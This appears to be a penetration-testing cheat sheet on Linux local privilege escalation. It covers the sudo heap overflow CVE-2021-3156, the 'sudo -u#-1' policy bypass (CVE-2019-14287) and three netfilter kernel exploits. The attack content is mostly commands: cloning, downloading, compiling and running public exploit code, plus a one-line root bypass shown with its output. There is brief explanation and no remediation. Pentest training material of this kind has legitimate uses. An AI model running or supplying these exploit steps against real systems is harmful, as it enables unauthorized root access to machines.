# 0-Days
`The Guide`

- [Sudo](#sudo)
  - [usage](#usage)
  - [Sudo policy bypass](#sudo-policy-bypass)
- [Netfilter](#netfilter)

# Sudo
One of the latest vulnerabilities for sudo carries the CVE-2021-3156 and is based on a heap-based buffer overflow vulnerability. This affected the sudo versions:

    1.8.31 - Ubuntu 20.04
    1.8.27 - Debian 10
    1.9.2 - Fedora 33
    and others

To find out the version of sudo, the following command is sufficient:

```bash
sudo -V | head -n1
```
**POC**
```bash
git clone https://github.com/blasty/CVE-2021-3156.git
cd CVE-2021-3156
make
```
### Usage
```bash
./sudo-hax-me-a-sandwich

** CVE-2021-3156 PoC by blasty <peter@haxx.in>

  usage: ./sudo-hax-me-a-sandwich <target>

  available targets:
  ------------------------------------------------------------
    0) Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27
    1) Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31
    2) Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28
  ------------------------------------------------------------

```
### Sudo Policy Bypass
> Another vulnerability was found in 2019 that affected all versions below 1.8.28, which allowed privileges to escalate even with a simple command. This vulnerability has the CVE-2019-14287 and requires only a single prerequisite. It had to allow a user in the /etc/sudoers file to execute a specific command.
```bash
sudo -u#-1 id
id
uid=0(root) gid=1005(cry0l1t3) groups=1005(cry0l1t3)
```

## Netfilter
>Netfilter is a Linux kernel module that provides, among other things, packet filtering, network address translation, and other tools relevant to firewalls. It controls and regulates network traffic by manipulating individual packets based on their characteristics and rules. Netfilter is also called the software layer in the Linux kernel. 
1. 2021 ([CVE-2021-22555](https://github.com/google/security-research/tree/master/pocs/linux/cve-2021-22555)) `
5.10.5-051005-generic`
```bash
wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
 gcc -m32 -static exploit.c -o exploit
./exploit
```
2. 2022 ([CVE-2022-25636](https://www.cvedetails.com/cve/CVE-2022-25636/)) `5.13.0-051300-generic`
```bash
git clone https://github.com/Bonfee/CVE-2022-25636.git
cd CVE-2022-25636
make
./exploit
```
Learn [More](https://nickgregory.me/post/2022/03/12/cve-2022-25636/).
3. 2023 ([CVE-2023-32233](https://github.com/Liuk3r/CVE-2023-32233))
```bash
git clone https://github.com/Liuk3r/CVE-2023-32233
cd CVE-2023-32233
gcc -Wall -o exploit exploit.c -lmnl -lnftnl
```
> This vulnerability exploits the so called anonymous sets in `nf_tables` by using the `Use-After-Free` vulnerability in the Linux Kernel up to version `6.3.1`. These `nf_tables` are temprorary workspaces for processing batch requests and once the processing is done, these anonymous sets are supposed to be cleared out (Use-After-Free) so they cannot be used anymore. Due to a mistake in the code, these anonymous sets are not being handled properly and can still be accessed and modified by the program.

The exploitation is done by manipulating the system to use the cleared out anonymous sets to interact with the kernel's memory. By doing so, we can potentially gain root privileges.
